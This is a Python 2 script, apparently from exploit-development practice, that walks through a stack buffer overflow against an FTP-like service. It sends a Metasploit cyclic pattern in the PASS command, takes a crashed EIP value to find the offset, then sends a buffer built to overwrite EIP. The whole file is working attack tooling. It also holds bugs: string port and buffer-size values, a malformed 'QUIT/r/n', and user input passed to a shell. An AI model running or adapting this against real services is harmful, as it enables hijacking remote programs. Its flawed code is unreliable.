#!/usr/bin/python
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Gather target information
target = raw_input("[*] Enter target IP:\n")
port = raw_input("[*] Enter target port:\n")
buffsize = raw_input("[*] Enter desired buffer size:\n")

# Create unique string and prevent output clutter
print "\n[*] Creating unique string..."
ustring = subprocess.check_output("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb "
                                  "-l " + buffsize, shell=True)
print "[*] Unique string created\n"

# Example code of sending generated string to trigger overflow
try:
    print "[*] Connecting to target..."
    s.connect((target,port))
    print "[*] Connected to target\n"
    s.recv(1024)
    s.send('USER evil\r\n')
    s.recv(1024)
    print "[*] Sending unique string to target..."
    s.send('PASS ' + ustring + '\r\n')
    s.send('QUIT/r/n')
    print "[*] Overflow sent.\n"
except:
    print "[!] Could not connect to target\n"

s.close()
# Example end

# Request EIP value to find offset
val = raw_input("[*] Provide value of EIP:\n")

# Take provided EIP, determine offset, and print offset
print "\n[*] Finding offset based on given EIP..."
offset = subprocess.check_output("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb "
				 "-l " + buffsize + " -q " + val, shell=True)
offset = int(offset[26:])
print "[*] Offset found:\n%s\n" % offset

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Ask user to restart the service and type 'ready' to start
i = 0
while i == 0: 
    ready = raw_input("[*] Type 'ready' once you are reattached to the process so the "
                      "new overflow can be sent:\n")
    if str(ready) == 'ready':
# Example code of sending "B" overwritten EIP
        i += 1
        buffer = "A" * offset + "B" * 4 + "C" * (buffsize - offset - 4)
        print "\n[*] Connecting to target..."
        s.connect((target,port))
        print "[*] Connected to target\n"
        s.recv(1024)
        s.send('USER evil\r\n')
        s.recv(1024)
        print "[*] Sending new buffer to target..."
        s.send('PASS ' + buffer + '\r\n')
        s.send('QUIT\r\n')
        print "[*] Overflow sent. Closing socket.\n"

s.close()
# Example end
